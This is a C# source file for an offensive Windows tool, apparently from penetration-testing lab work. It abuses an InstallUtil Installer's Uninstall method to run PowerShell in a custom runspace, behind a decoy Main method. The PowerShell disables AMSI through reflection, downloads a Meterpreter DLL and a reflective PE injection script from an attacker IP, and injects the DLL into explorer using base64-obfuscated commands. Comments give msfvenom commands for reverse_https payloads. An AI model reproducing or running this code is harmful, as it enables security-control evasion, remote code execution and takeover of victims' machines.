using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;
// $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Users\\test.txt";

            //reflective
            //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 -f dll -o /var/www/html/met.dll
            //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.189 LPORT=4447 EXITFUNC=thread -f dll -e x64/xor_dynamic -a x64 -o /var/www/html/met.dll
            // String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.0/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.0.0/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";

            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.189/ambypass.ps1') | IEX; " +
                         "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.189/met.dll'); " +
                         "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.189/pesmall.ps1') | IEX; " +
                         "$procid = (Get-Process -Name explorer).Id; " +
                         "Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";


            String cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);" +
             "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.189/met.dll'); " +
             "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.189/pesmall.ps1') | IEX; " +
             "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JHByb2NpZCA9IChHZXQtUHJvY2VzcyAtTmFtZSBleHBsb3JlcikuSWQ7IA==')) | IEX;" +
             "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbiAtUEVCeXRlcyAkYnl0ZXMgLVByb2NJZCAkcHJvY2lk')) | IEX;";
            // JHByb2NpZCA9IChHZXQtUHJvY2VzcyAtTmFtZSBzdmNob3N0KS5JZDsg

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}